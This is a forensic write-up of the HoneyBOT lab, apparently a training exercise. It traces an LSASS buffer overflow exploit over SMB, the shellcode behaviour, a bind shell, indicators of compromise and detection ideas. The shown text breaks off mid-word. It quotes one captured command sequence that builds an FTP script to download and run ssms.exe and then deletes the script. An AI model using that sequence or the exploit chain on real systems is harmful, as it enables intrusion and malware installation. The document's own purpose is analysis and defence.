# 🐝 HoneyBOT Lab – Complete Forensic Investigation Documentation

## 📌 Overview

This document provides a complete technical breakdown of the HoneyBOT lab investigation. The attack involves exploitation of a vulnerable Windows system using a buffer overflow in LSASS, followed by shellcode execution, backdoor creation, and malware download.

---

# 🧠 Environment Summary

| Role              | IP Address     |
| ----------------- | -------------- |
| Attacker          | 98.114.205.102 |
| Victim (Honeypot) | 192.150.11.111 |

Attack Duration: **16 seconds**
Attack Vector: **DCE/RPC over SMB (Port 445)**
Exploited Vulnerability: **CVE-2003-0533 (LSASS Buffer Overflow)**

---

# 🔍 Step-by-Step Attack Breakdown

---

## 1️⃣ Initial Connection (TCP Handshake)

Attacker initiates connection to victim on SMB port 445.

```
SYN → 445
SYN-ACK
ACK
```

This establishes a TCP session.

---

## 2️⃣ SMB Session Establishment

The attacker negotiates SMB protocol and establishes a session.

SMB acts as the transport layer for DCE/RPC communication.

---

## 3️⃣ DCE/RPC Exploitation

The attacker sends a malicious DCE/RPC request targeting the LSASS service.

### 📌 What is LSASS?

LSASS (Local Security Authority Subsystem Service) is responsible for:

* User authentication
* Password validation
* Security policy enforcement
* Domain authentication

Process Name:

```
lsass.exe
```

---

## 4️⃣ Buffer Overflow (CVE-2003-0533)

The attacker sends an oversized RPC payload containing:

* Large buffer of junk data
* NOP sled (0x90 instructions)
* Encoded shellcode

Because LSASS does not properly validate input length, a buffer overflow occurs.

### What Happens Internally?

* Memory gets overwritten
* Instruction Pointer (EIP) is redirected
* Execution jumps to attacker’s shellcode

This grants SYSTEM-level execution.

---

## 5️⃣ Shellcode Behavior

The shellcode performs the following actions:

* Decodes itself using XOR key `0x99`
* Locates `kernel32.dll` using PEB traversal
* Resolves APIs dynamically using:

  * `GetProcAddress`
  * `LoadLibraryA`
  * `CreateProcessA`

---

## 6️⃣ Backdoor Creation (Bind Shell)

The shellcode creates a bind shell on:

```
Port 1957
```

This allows the attacker to connect directly to the compromised system.

---

## 7️⃣ Malware Download via FTP

Attacker instructs victim to download additional malware.

Observed command sequence:

```
echo open 0.0.0.0 8884 > o
echo user 1 1 >> o
echo get ssms.exe >> o
echo quit >> o
ftp -n -s:o
del /F /Q o & ssms.exe
```

### Key Observations:

* FTP used over port 8884 (non-standard)
* Malware downloaded: `ssms.exe`
* Script file deleted after execution

---

## 8️⃣ Malware Intelligence

Extracted file hash:

```
SHA256:
B14CCB3786AF7553F7C251623499A7FE67974DDE69D3DFFD65733871CDDF6B6D
```

First submission to VirusTotal:

```
2007-06-27
```

---

# 📊 Network Forensic Indicators

### Indicators of Compromise (IOCs)

* Attacker IP: 98.114.205.102
* SMB Exploit Traffic on Port 445
* DCE/RPC Bind Requests
* Large RPC payload with NOP sled
* Bind shell on Port 1957
* FTP transfer on Port 8884
* File: ssms.exe

---

# 🛡 Detection Opportunities

Security teams should monitor for:

* Excessively large DCE/RPC requests
* LSASS abnormal behavior or crashes
* Unexpected bind shells
* Outbound FTP to uncommon ports
* Repeated SMB session attempts

---

# 🎯 Attack Chain Summary

1. TCP connection established
2. SMB session negotiated
3. DCE/RPC exploit delivered
4. LSASS buffer overflow triggered
5. Shellcode executed as SYSTEM
6. Bind shell opened on port 1957
7. Malware downloaded via FTP (port 8884)
8. Secondary payload executed

---

# 🧠 Key Learning Outcomes

* Understanding DCE/RPC exploitation over SMB
* Recognizing buffer overflow patterns in PCAP
* Identifying shellcode behavior
* Extracting and hashing malware
* Correlating artifacts with threat intelligence

---

# 📚 Conclusion

The HoneyBOT lab demonstrates a complete remote exploitation chain using an LSASS buffer overflow vulnerability. The attack was automated, fast (16 seconds), and involved privilege escalation, persistence, and secondary malware d
